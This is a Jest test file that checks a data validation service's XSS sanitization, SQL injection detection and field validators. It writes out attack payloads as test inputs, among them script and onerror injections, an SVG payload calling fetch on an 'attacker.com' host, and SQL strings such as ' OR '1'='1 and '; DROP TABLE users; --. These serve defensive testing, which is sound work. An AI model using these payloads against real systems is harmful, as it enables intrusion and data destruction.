/**
 * DataValidationService Integration Tests
 * Phase 22.16: API Integration & Security Service Tests
 *
 * Tests XSS prevention, SQL injection detection, sanitization,
 * input validation, and edge cases with malicious payloads.
 */

import { DataValidationService } from '@/utils/security/dataValidationService';
import { AttackVectors } from './fixtures/attackVectors';
import { MockPayloads } from './fixtures/mockPayloads';

describe('DataValidationService Integration Tests', () => {
  describe('XSS Prevention', () => {
    it('should detect and prevent script tags', () => {
      const xssPayload = AttackVectors.XSS_VECTORS.SCRIPT_TAG;
      const sanitized = DataValidationService.sanitizeInput(xssPayload);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('</script>');
    });

    it('should prevent image onerror handlers', () => {
      const xssPayload = AttackVectors.XSS_VECTORS.IMG_ONERROR;
      const sanitized = DataValidationService.sanitizeInput(xssPayload);

      expect(sanitized.toLowerCase()).not.toMatch(/onerror\s*=/i);
    });

    it('should prevent SVG onload handlers', () => {
      const xssPayload = AttackVectors.XSS_VECTORS.SVG_ONLOAD;
      const sanitized = DataValidationService.sanitizeInput(xssPayload);

      expect(sanitized).not.toMatch(/onload\s*=/i);
    });

    it('should prevent iframe injection', () => {
      const xssPayload = AttackVectors.XSS_VECTORS.IFRAME;
      const sanitized = DataValidationService.sanitizeInput(xssPayload);

      expect(sanitized).not.toContain('iframe');
    });

    it('should block javascript: protocol', () => {
      const xssPayload = AttackVectors.XSS_VECTORS.JAVASCRIPT_PROTOCOL;
      const safe = DataValidationService.isSafeString(xssPayload);

      expect(safe).toBe(false);
    });

    it('should sanitize various event handlers', () => {
      const eventHandlers = [
        'onclick',
        'onload',
        'onerror',
        'onmouseover',
        'onchange',
        'onsubmit',
        'onfocus',
      ];

      for (const handler of eventHandlers) {
        const payload = `<div ${handler}=alert(1)>test</div>`;
        const sanitized = DataValidationService.sanitizeInput(payload);
        expect(sanitized.toLowerCase()).not.toContain(`${handler}=`);
      }
    });

    it('should handle DOM-based XSS attempts', () => {
      const xssPayload = AttackVectors.XSS_VECTORS.FORM_HANDLER;
      const sanitized = DataValidationService.sanitizeInput(xssPayload);

      expect(sanitized.toLowerCase()).not.toMatch(/onfocus\s*=/i);
    });
  });

  describe('SQL Injection Prevention', () => {
    it('should detect OR 1=1 injection', () => {
      const sqlPayload = AttackVectors.SQL_INJECTION_VECTORS.OR_TRUE;
      const isSafe = DataValidationService.preventSqlInjection(sqlPayload);

      expect(isSafe).toBe(false);
    });

    it('should detect admin comment bypass', () => {
      const sqlPayload = AttackVectors.SQL_INJECTION_VECTORS.ADMIN_LOGIN;
      const isSafe = DataValidationService.preventSqlInjection(sqlPayload);

      expect(isSafe).toBe(false);
    });

    it('should detect UNION SELECT injection', () => {
      const sqlPayload = AttackVectors.SQL_INJECTION_VECTORS.UNION_SELECT;
      const isSafe = DataValidationService.preventSqlInjection(sqlPayload);

      expect(isSafe).toBe(false);
    });

    it('should detect DROP TABLE injection', () => {
      const sqlPayload = AttackVectors.SQL_INJECTION_VECTORS.DROP_TABLE;
      const isSafe = DataValidationService.preventSqlInjection(sqlPayload);

      expect(isSafe).toBe(false);
    });

    it('should detect time-based blind SQL injection', () => {
      const sqlPayload = AttackVectors.SQL_INJECTION_VECTORS.TIME_BASED;
      const isSafe = DataValidationService.preventSqlInjection(sqlPayload);

      expect(isSafe).toBe(false);
    });

    it('should detect comment-based bypass', () => {
      const sqlPayload = AttackVectors.SQL_INJECTION_VECTORS.COMMENT_ESCAPE;
      const isSafe = DataValidationService.preventSqlInjection(sqlPayload);

      expect(isSafe).toBe(false);
    });

    it('should detect hash-based bypass', () => {
      const sqlPayload = AttackVectors.SQL_INJECTION_VECTORS.HASH_ESCAPE;
      const isSafe = DataValidationService.preventSqlInjection(sqlPayload);

      expect(isSafe).toBe(false);
    });
  });

  describe('Email Validation', () => {
    it('should accept valid email addresses', () => {
      const validEmails = [
        'user@example.com',
        'test.user@domain.co.uk',
        'info+tag@company.org',
      ];

      for (const email of validEmails) {
        expect(DataValidationService.validateEmail(email)).toBe(true);
      }
    });

    it('should reject invalid email formats', () => {
      const invalidEmails = [
        'notanemail',
        '@example.com',
        'user@',
        'user @example.com',
        'user@example',
      ];

      for (const email of invalidEmails) {
        expect(DataValidationService.validateEmail(email)).toBe(false);
      }
    });

    it('should reject emails with SQL injection attempts', () => {
      const sqlInjectionEmail = "user@example.com' OR '1'='1";
      expect(DataValidationService.validateEmail(sqlInjectionEmail)).toBe(false);
    });
  });

  describe('URL Validation', () => {
    it('should accept valid URLs', () => {
      const validUrls = [
        'https://example.com',
        'http://www.example.com/path',
        'https://subdomain.example.com:8080/path?query=value',
      ];

      for (const url of validUrls) {
        expect(DataValidationService.validateUrl(url)).toBe(true);
      }
    });

    it('should reject invalid URLs', () => {
      const invalidUrls = [
        'not a url',
        'htp://wrong.com',
        '//example.com',
        'example.com',
      ];

      for (const url of invalidUrls) {
        expect(DataValidationService.validateUrl(url)).toBe(false);
      }
    });

    it('should reject javascript: URLs', () => {
      const jsUrl = 'javascript:alert(1)';
      expect(DataValidationService.validateUrl(jsUrl)).toBe(false);
    });
  });

  describe('Phone Number Validation', () => {
    it('should accept valid phone numbers', () => {
      const validPhones = [
        '+1-555-123-4567',
        '(555) 123-4567',
        '555 123 4567',
        '+44 20 7946 0958',
      ];

      for (const phone of validPhones) {
        expect(DataValidationService.validatePhoneNumber(phone)).toBe(true);
      }
    });

    it('should reject invalid phone numbers', () => {
      const invalidPhones = ['123', 'abc', '   ', '!@#$%'];

      for (const phone of invalidPhones) {
        expect(DataValidationService.validatePhoneNumber(phone)).toBe(false);
      }
    });
  });

  describe('Password Validation', () => {
    it('should accept strong passwords', () => {
      const strongPasswords = [
        'MyPassword123!@#',
        'Secure&Pass456!',
        'Complex@Pass789#',
      ];

      for (const password of strongPasswords) {
        expect(DataValidationService.validatePassword(password)).toBe(true);
      }
    });

    it('should reject weak passwords', () => {
      const weakPasswords = [
        'short',
        'password',
        'PASSWORD',
        'Password123', // No special char
        'password!@#', // No uppercase, no number
        'PASSWORD123!', // No lowercase
      ];

      for (const password of weakPasswords) {
        expect(DataValidationService.validatePassword(password)).toBe(false);
      }
    });

    it('should require minimum 8 characters', () => {
      const shortPassword = 'Pass1!';
      expect(DataValidationService.validatePassword(shortPassword)).toBe(false);
    });
  });

  describe('Input Sanitization', () => {
    it('should remove dangerous characters', () => {
      const input = 'test<script>alert(1)</script>';
      const sanitized = DataValidationService.sanitizeInput(input);

      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
      expect(sanitized).not.toContain('script');
    });

    it('should remove javascript: protocol', () => {
      const input = 'javascript:alert(1)';
      const sanitized = DataValidationService.sanitizeInput(input);

      expect(sanitized).not.toContain('javascript:');
    });

    it('should remove event handlers', () => {
      const input = 'test onclick=alert(1)';
      const sanitized = DataValidationService.sanitizeInput(input);

      expect(sanitized.toLowerCase()).not.toMatch(/onclick\s*=/i);
    });

    it('should preserve safe content', () => {
      const input = 'Hello, World! This is safe content 123';
      const sanitized = DataValidationService.sanitizeInput(input);

      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('World');
      expect(sanitized).toContain('safe');
    });

    it('should handle empty strings', () => {
      expect(DataValidationService.sanitizeInput('')).toBe('');
      expect(DataValidationService.sanitizeInput(null as any)).toBe('');
    });
  });

  describe('HTML Sanitization', () => {
    it('should escape HTML special characters', () => {
      const html = '<div>test & content</div>';
      const sanitized = DataValidationService.sanitizeHtml(html);

      // Should escape angle brackets or remove content
      expect(sanitized.includes('<div>')).toBe(false);
    });

    it('should handle script tags', () => {
      const html = '<script>alert("XSS")</script>';
      const sanitized = DataValidationService.sanitizeHtml(html);

      expect(sanitized).not.toContain('<script>');
    });
  });

  describe('Character Escaping', () => {
    it('should escape special characters', () => {
      const dangerous = '&<>"\'';
      const escaped = DataValidationService.escapeSpecialChars(dangerous);

      expect(escaped).toContain('&amp;');
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
      expect(escaped).toContain('&quot;');
      expect(escaped).toContain('&#x27;');
    });

    it('should escape forward slashes', () => {
      const input = 'path/to/resource';
      const escaped = DataValidationService.escapeSpecialChars(input);

      expect(escaped).toContain('&#x2F;');
    });
  });

  describe('Safe String Detection', () => {
    it('should identify safe strings', () => {
      const safeStrings = [
        'Hello World',
        'test123',
        'user@example.com',
        '2024-10-08',
      ];

      for (const str of safeStrings) {
        expect(DataValidationService.isSafeString(str)).toBe(true);
      }
    });

    it('should reject strings with script tags', () => {
      expect(DataValidationService.isSafeString('<script>alert(1)</script>')).toBe(false);
    });

    it('should reject strings with event handlers', () => {
      expect(DataValidationService.isSafeString('<div onclick=alert(1)>')).toBe(
        false
      );
    });

    it('should reject strings with dangerous characters', () => {
      const dangerous = 'test<>{}';
      expect(DataValidationService.isSafeString(dangerous)).toBe(false);
    });
  });

  describe('Batch Validation', () => {
    it('should validate multiple fields', () => {
      const values = {
        email: 'user@example.com',
        password: 'SecurePass123!@',
        phone: '+1-555-123-4567',
      };

      const rules = {
        email: { type: 'email' as const },
        password: { type: 'password' as const },
        phone: { type: 'phone' as const },
      };

      const result = DataValidationService.validateBatch(values, rules);

      expect(result.valid).toBe(true);
      expect(Object.keys(result.errors).length).toBe(0);
    });

    it('should report validation errors for invalid fields', () => {
      const values = {
        email: 'invalid-email',
        password: 'weak',
      };

      const rules = {
        email: { type: 'email' as const },
        password: { type: 'password' as const },
      };

      const result = DataValidationService.validateBatch(values, rules);

      expect(result.valid).toBe(false);
      expect(Object.keys(result.errors).length).toBeGreaterThan(0);
    });
  });

  describe('Custom Validation Rules', () => {
    it('should support custom validators', () => {
      const rule = {
        type: 'custom' as const,
        validator: (value: string) => value.startsWith('TEST'),
      };

      expect(DataValidationService.validateInput('TEST123', rule)).toBe(true);
      expect(DataValidationService.validateInput('invalid', rule)).toBe(false);
    });

    it('should support custom regex patterns', () => {
      const rule = {
        type: 'custom' as const,
        pattern: /^[A-Z]{3}\d{3}$/,
      };

      expect(DataValidationService.validateInput('ABC123', rule)).toBe(true);
      expect(DataValidationService.validateInput('abc123', rule)).toBe(false);
    });

    it('should support length constraints', () => {
      const rule = {
        type: 'custom' as const,
        minLength: 5,
        maxLength: 10,
      };

      expect(DataValidationService.validateInput('12345', rule)).toBe(true);
      expect(DataValidationService.validateInput('1234', rule)).toBe(false);
      expect(DataValidationService.validateInput('12345678901', rule)).toBe(false);
    });
  });

  describe('Edge Cases', () => {
    it('should handle null inputs', () => {
      expect(DataValidationService.sanitizeInput(null as any)).toBe('');
      expect(DataValidationService.validateEmail(null as any)).toBe(false);
      expect(DataValidationService.isSafeString(null as any)).toBe(false);
    });

    it('should handle undefined inputs', () => {
      expect(DataValidationService.sanitizeInput(undefined as any)).toBe('');
      expect(DataValidationService.validateEmail(undefined as any)).toBe(false);
    });

    it('should handle empty strings', () => {
      expect(DataValidationService.sanitizeInput('')).toBe('');
      expect(DataValidationService.validateEmail('')).toBe(false);
      expect(DataValidationService.isSafeString('')).toBe(false);
    });

    it('should handle whitespace-only strings', () => {
      const whitespace = '   \t\n\r   ';
      const sanitized = DataValidationService.sanitizeInput(whitespace);
      expect(sanitized.trim()).toBe('');
    });

    it('should handle very long strings', () => {
      const longString = 'x'.repeat(1000000);
      const sanitized = DataValidationService.sanitizeInput(longString);
      expect(sanitized.length).toBeGreaterThan(0);
    });

    it('should handle special characters', () => {
      const special = '!@#$%^&*()_+-=[]{}|;:,.<>?';
      const sanitized = DataValidationService.sanitizeInput(special);
      // Should remove some but preserve some
      expect(sanitized.length).toBeLessThanOrEqual(special.length);
    });

    it('should handle Unicode and emoji', () => {
      const unicode = '你好世界 مرحبا بالعالم 😀🎉';
      const sanitized = DataValidationService.sanitizeInput(unicode);
      expect(sanitized.length).toBeGreaterThan(0);
    });

    it('should handle mixed encodings', () => {
      const mixed = 'Hello%20World%3Cscript%3E';
      const sanitized = DataValidationService.sanitizeInput(mixed);
      // Should handle encoded content
      expect(sanitized).toBeDefined();
    });

    it('should handle null bytes', () => {
      const nullByte = 'test\x00injection';
      const sanitized = DataValidationService.sanitizeInput(nullByte);
      expect(sanitized).toBeDefined();
    });
  });

  describe('Performance', () => {
    it('should validate strings quickly', () => {
      const iterations = 10000;
      const testString = 'valid.string@example.com';

      const start = Date.now();
      for (let i = 0; i < iterations; i++) {
        DataValidationService.validateEmail(testString);
      }
      const elapsed = Date.now() - start;

      // 10000 validations should be fast
      expect(elapsed).toBeLessThan(1000); // 1ms average
    });

    it('should sanitize strings quickly', () => {
      const iterations = 1000;
      const testString = '<script>alert("test")</script>';

      const start = Date.now();
      for (let i = 0; i < iterations; i++) {
        DataValidationService.sanitizeInput(testString);
      }
      const elapsed = Date.now() - start;

      expect(elapsed).toBeLessThan(500);
    });
  });

  describe('Real-world Attack Patterns', () => {
    it('should prevent reflected XSS attacks', () => {
      const attackPayloads = [
        '<img src=x onerror=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '<svg/onload=fetch("http://attacker.com")>',
      ];

      for (const payload of attackPayloads) {
        expect(DataValidationService.isSafeString(payload)).toBe(false);
      }
    });

    it('should prevent stored XSS attacks', () => {
      const storedPayload = MockPayloads.XSS_SCRIPT_TAG_REQUEST.data;
      const sanitized = DataValidationService.sanitizeInput(storedPayload);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
    });

    it('should prevent SQL injection in forms', () => {
      const sqlPayloads = [
        "admin' --",
        "' OR '1'='1",
        "'; DROP TABLE users; --",
      ];

      for (const payload of sqlPayloads) {
        expect(DataValidationService.preventSqlInjection(payload)).toBe(false);
      }
    });
  });
});
